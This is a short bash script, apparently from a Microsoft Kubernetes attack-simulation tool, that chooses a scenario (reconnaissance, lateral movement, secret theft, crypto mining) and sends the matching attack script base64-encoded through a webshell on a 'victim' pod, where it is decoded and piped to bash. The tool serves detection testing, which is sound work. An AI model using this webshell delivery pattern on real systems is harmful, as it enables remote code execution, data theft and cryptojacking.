#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

sleep 10
echo "Started at `date`"
echo " "
case $SCENARIO in
    recon)
        attack_script=recon.sh
        ;;
    lateral-mov)
        attack_script=lateral-mov.sh
        ;;
    secrets)
        attack_script=secrets-and-files.sh
        ;;
    crypto)
        envsubst '${NAME}' < crypto.sh > attack_script.sh
        attack_script=attack_script.sh
        python3 -m http.server 80 > /dev/null 2>&1 &
        sleep 2
        ;;
    all)
        envsubst '${NAME}' < all-scenarios.sh > attack_script.sh
        attack_script=attack_script.sh
        python3 -m http.server 80 > /dev/null 2>&1 &
        sleep 2
        ;;
    webshell)
        echo "--- Webshell ---"
        echo "Sending command \"whoami\" to victim"
        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php"
        echo " "
        echo "--- Simulation completed ---"
        exit
        ;;
    *)
        echo "No matching scenario found. exiting"
        exit
        ;;
    esac
script_b64=$(cat $attack_script | base64 -w0)
echo "--- Webshell ---"
echo "Sending payload request to the victim pod"
echo " "
curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php"
echo "--- Simulation completed ---"
